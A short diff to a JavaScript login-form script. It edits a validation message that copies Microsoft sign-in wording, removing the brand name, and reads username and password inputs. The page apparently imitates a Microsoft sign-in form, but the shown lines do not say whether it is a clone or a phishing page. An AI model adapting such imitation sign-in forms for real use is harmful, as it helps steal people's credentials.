@@ -50,7 +50,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Original logic
     const unReq = "Enter a valid email address, phone number, or Skype name.";
-    const pwdReq = "Please enter the password for your Microsoft account.";
+    const pwdReq = "Please enter the password for your account.";
 
     const unameInp = document.getElementById('inp_uname');
     const pwdInp = document.getElementById('inp_pwd');
